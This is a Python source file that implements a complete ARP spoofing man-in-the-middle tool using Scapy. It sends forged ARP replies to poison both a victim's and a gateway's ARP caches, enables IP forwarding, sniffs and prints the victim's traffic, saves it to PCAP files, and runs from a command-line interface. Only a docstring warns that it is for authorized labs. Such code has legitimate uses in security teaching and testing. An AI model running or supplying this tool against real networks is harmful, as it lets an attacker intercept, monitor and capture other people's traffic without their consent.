"""
ARP Spoofing module (detailed comments)

This file implements a simple ARP spoofing class that can poison ARP
tables of a target and a gateway to perform a Man-in-the-Middle (MITM).

Important safety note:
- This code interacts with the local network and sends crafted ARP
  packets. Use only in an authorized, isolated lab.
"""

import sys
import time
import argparse
import os
from datetime import datetime
from pathlib import Path

# Import only the necessary Scapy symbols to keep namespaces clear
from scapy.all import ARP, send, sniff, PcapWriter, ICMP, IP, TCP, UDP

# Ensure the project root is available on sys.path so relative imports work
sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger
from utils.network_utils import get_mac, enable_ip_forwarding, disable_ip_forwarding


class ARPSpoofer:
    """Class to perform ARP table poisoning (ARP spoofing).

    Usage:
      spoofer = ARPSpoofer(target_ip, gateway_ip, interface=None)
      spoofer.start_attack(interval=2, capture=True)

    The class provides methods to start/stop the attack, restore ARP
    tables, and optionally sniff traffic while the MITM is active.
    """

    def __init__(self, target_ip, gateway_ip, interface=None):
        # Store key configuration values
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface

        # Logger for lifecycle and error messages
        self.logger = get_logger("ARPSpoof")

        # Resolve MAC addresses for target and gateway using helper
        # `get_mac`; if MAC resolution fails, `_validate_targets` will
        # report an error and the attack won't start.
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)

        # Runtime state variables
        self.packets_sent = 0       # Counter for ARP packets sent
        self.is_running = False     # Flag indicating if attack loop is active
        self.start_time = None      # Timestamp when attack started

        # PCAP writer and file path (created when capture enabled)
        self.pcap_file = None
        self.pcap_writer = None

        # Log initialization details for debugging and auditing
        self.logger.info(f"Initialized ARPSpoofer: target={target_ip} gateway={gateway_ip} iface={interface}")

    # ------------------------------------------------------------------
    # SCHEMA / Quick Reference
    # ------------------------------------------------------------------
    # Class: ARPSpoofer
    # Attributes:
    #   - target_ip: str           # victim IP
    #   - gateway_ip: str          # router/gateway IP
    #   - interface: Optional[str] # network interface (e.g. 'eth0')
    #   - target_mac: Optional[str]
    #   - gateway_mac: Optional[str]
    #   - packets_sent: int
    #   - is_running: bool
    #   - start_time: Optional[datetime]
    #   - pcap_file: Optional[Path]
    #   - pcap_writer: Optional[PcapWriter]
    # Methods (signatures):
    #   - _validate_targets() -> bool
    #   - spoof(target_ip: str, spoof_ip: str, target_mac: str) -> None
    #   - restore(destination_ip: str, source_ip: str, destination_mac: str, source_mac: str) -> None
    #   - start_attack(interval: int = 2, capture: bool = True) -> None
    #   - stop_attack() -> None
    #   - sniff_traffic(count: int = 100, filter_str: Optional[str] = None) -> None
    #   - _packet_callback(packet) -> None
    # Usage (high-level):
    #   spoofer = ARPSpoofer('192.168.1.10', '192.168.1.1', interface='eth0')
    #   spoofer.start_attack(interval=2, capture=True)  # runs until stop_attack()
    #   spoofer.stop_attack()
    # ------------------------------------------------------------------

    def _validate_targets(self):
        """Ensure both target and gateway MAC addresses were resolved.

        Returns True if both MAC addresses are available, False otherwise.
        This prevents starting an attack when we can't address-layer reach
        the hosts.
        """
        if not self.target_mac:
            self.logger.error(f"Cannot resolve MAC for target {self.target_ip}")
            return False

        if not self.gateway_mac:
            self.logger.error(f"Cannot resolve MAC for gateway {self.gateway_ip}")
            return False

        self.logger.info("Target and gateway MAC addresses validated")
        return True

    def spoof(self, target_ip, spoof_ip, target_mac):
        """Send a single forged ARP reply (poisoning packet).

        The forged ARP reply tells `target_ip` that `spoof_ip` is at our
        MAC address. When repeated, this poisons the target's ARP cache.

        Arguments:
            target_ip: IP of the machine that will receive the ARP reply
            spoof_ip: IP address we are claiming to be (gateway or target)
            target_mac: Hardware (MAC) address of the machine receiving
                        the ARP reply
        """
        # Build an ARP reply (op=2). We set `psrc` to the spoofed IP; `pdst`
        # and `hwdst` target the victim. `hwsrc` (our MAC) is left to the
        # kernel/Scapy (Scapy will fill it with the interface MAC).
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

        # Send the packet on the specified interface (if provided) and
        # avoid verbose output to keep logs clean.
        send(packet, verbose=False, iface=self.interface)

        # Update sent counter for statistics
        self.packets_sent += 1

    def restore(self, destination_ip, source_ip, destination_mac, source_mac):
        """Restore a correct ARP mapping by sending legitimate ARP replies.

        To undo poisoning, we send multiple ARP replies that map `source_ip`
        to the real `source_mac` to the `destination_ip` host. Sending
        several times increases the chance the target updates its cache.
        """
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

        # Send several times to ensure the table is corrected on unreliable
        # networks or if packets are dropped.
        send(packet, count=5, verbose=False, iface=self.interface)

    def start_attack(self, interval=2, capture=True):
        """Start the ARP spoofing loop.

        This method performs the following steps:
        1. Validate targets (MAC resolution)
        2. Enable IP forwarding on the host (so traffic is forwarded)
        3. Optionally open a PCAP writer to capture sniffed traffic
        4. Enter a loop that alternately spoofs the target and gateway
           until `stop_attack` is called

        Parameters:
            interval: seconds between consecutive spoof packets
            capture: whether to capture traffic to a PCAP file
        """
        # Ensure we can reach the link-layer addresses before proceeding
        if not self._validate_targets():
            return

        # Enable kernel IP forwarding to allow the machine to forward packets
        # between victim and gateway while acting as MITM.
        enable_ip_forwarding()

        # If capture requested, prepare the pcap directory and writer.
        if capture:
            pcap_dir = Path("pcap")
            pcap_dir.mkdir(exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.pcap_file = pcap_dir / f"arp_spoof_{timestamp}.pcap"
            self.pcap_writer = PcapWriter(str(self.pcap_file), append=True, sync=True)
            self.logger.info(f"PCAP capture enabled: {self.pcap_file}")

        # Set runtime flags and start time for statistics
        self.is_running = True
        self.start_time = datetime.now()

        self.logger.info(f"Starting ARP spoofing: {self.target_ip} <-> {self.gateway_ip}")
        print("ARP spoofing started (press Ctrl+C to stop)")

        try:
            # Loop until `stop_attack` sets `is_running` to False
            while self.is_running:
                # Poison the target: tell the target that gateway IP is at our MAC
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)

                # Poison gateway: tell the gateway that the target IP is at our MAC
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                # Print a status line showing progress
                print(f"\rARP packets sent: {self.packets_sent}", end="", flush=True)

                # Sleep for the configured interval before sending again
                time.sleep(interval)

        except KeyboardInterrupt:
            # Allow interactive Ctrl+C to stop the attack gracefully
            print("\nInterrupted, stopping attack...")
            self.stop_attack()

    def stop_attack(self):
        """Stop the attack and restore ARP tables and cleanup resources.

        This method will:
        - set the running flag to False so the loop ends
        - send restoration ARP replies to both victim and gateway
        - disable IP forwarding on the host
        - close PCAP file if open
        - log final statistics
        """
        if not self.is_running:
            return

        # Mark that the attack should stop
        self.is_running = False

        print("Restoring ARP tables...")

        # Restore the victim's ARP table to map gateway_ip -> gateway_mac
        self.restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)

        # Restore the gateway's ARP table to map target_ip -> target_mac
        self.restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)

        print("ARP tables restored")

        # Disable kernel IP forwarding to revert system to previous state
        disable_ip_forwarding()

        # Close PCAP writer if it was used
        if self.pcap_writer:
            self.pcap_writer.close()
            print(f"PCAP saved: {self.pcap_file}")

        # Log and print attack statistics
        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            rate = self.packets_sent / duration if duration > 0 else 0
            stats = {
                "duration_s": f"{duration:.2f}",
                "packets_sent": int(self.packets_sent),
                "packets_per_second": f"{rate:.2f}"
            }
            self.logger.info(f"ARP spoofing stopped: {stats}")

    def sniff_traffic(self, count=100, filter_str=None):
        """Sniff traffic related to the target while MITM is active.

        This helper uses Scapy's `sniff` to capture packets that match a
        BPF filter (by default, host target_ip). Captured packets are
        written to the PCAP writer if capture was enabled when starting
        the attack.
        """
        self.logger.info("Starting traffic sniffing")

        try:
            if not filter_str:
                # Default to capturing traffic to/from the target IP
                filter_str = f"host {self.target_ip}"

            # Sniff the network; `prn` calls `_packet_callback` for each
            # packet which allows us to process and optionally save it.
            packets = sniff(count=count, filter=filter_str, iface=self.interface, prn=self._packet_callback)

            # If the pcap writer is available, ensure all packets are written
            if self.pcap_writer:
                for packet in packets:
                    self.pcap_writer.write(packet)

            self.logger.info(f"Captured {len(packets)} packets")

        except Exception as e:
            # Catch and log any errors during sniffing (permission issues,
            # invalid filter syntax, interface problems, etc.)
            self.logger.error(f"Error during sniffing: {e}")

    def _packet_callback(self, packet):
        """Callback executed for each sniffed packet.

        We filter to show packets that involve the target IP and optionally
        write them to the PCAP writer.
        """
        # Write packet to PCAP file if writer enabled
        if self.pcap_writer:
            self.pcap_writer.write(packet)

        # Only show packets that have an IP layer (skip link-local ARP etc.)
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Only present packets involving the target for clarity
            if src_ip == self.target_ip or dst_ip == self.target_ip:
                protocol = "Unknown"
                if packet.haslayer(TCP):
                    protocol = f"TCP:{packet[TCP].dport}"
                elif packet.haslayer(UDP):
                    protocol = f"UDP:{packet[UDP].dport}"
                elif packet.haslayer(ICMP):
                    protocol = "ICMP"

                print(f"{src_ip} -> {dst_ip} [{protocol}]")


def main():
    
    parser = argparse.ArgumentParser(description="ARP Spoofing - MITM tool")

    parser.add_argument('-t', '--target', required=True, help='Victim IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-i', '--interface', default=None, help='Network interface to use')
    parser.add_argument('--interval', type=int, default=2, help='Seconds between ARP packets')
    parser.add_argument('--no-capture', action='store_true', help='Disable PCAP capture')

    args = parser.parse_args()

    # Running the standalone script typically requires elevated privileges
    # because raw packet sending and sniffing are privileged operations.
    if os.name != 'nt':
        # On POSIX systems, check for root
        try:
            if os.geteuid() != 0:
                print("This script requires root privileges (sudo)")
                sys.exit(1)
        except AttributeError:
            # Some platforms may not support geteuid; ignore in that case
            pass

    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start_attack(interval=args.interval, capture=not args.no_capture)


if __name__ == "__main__":
    main()
